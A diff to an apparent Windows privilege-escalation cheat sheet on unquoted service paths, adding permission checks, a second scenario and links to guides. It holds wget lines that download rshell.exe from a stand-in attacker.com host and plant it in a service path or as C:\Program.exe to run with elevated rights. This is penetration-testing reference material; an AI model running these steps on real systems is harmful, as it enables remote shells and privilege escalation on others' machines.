@@ -102,11 +102,18 @@ SERVICENAME           PATH
 PFNet                 C:\Program Files\Privacyware\PrivFirewall 7.0\pfw.exe
 . . .                 . . .
 $ wmic service get pathname,startname   # Check if service runs with Admin privileges
+$ icacls/cacls service                  # Check for write permissions to folder: look for BUILTIN\USERS (W)
 $ wget http://attacker.com/rshell.exe -O C:\Program Files (x86)\Privacyware\PrivFirewall.exe   # Transfer rshell to path
-$ net start service / reboot computer /
+$ net start service / reboot computer
 
-
+# SCENARIO 2: Writable C:\
+$ wget http://attacker.com/rshell.exe -O C:\Program.exe
 ```
+
+Unquoted service path guides:
+* https://pentestlab.blog/2017/03/09/unquoted-service-path/
+* https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae
+* https://trustfoundry.net/practical-guide-to-exploiting-the-unquoted-service-path-vulnerability-in-windows/
 
 Windows weak service permissions:
 ```powershell
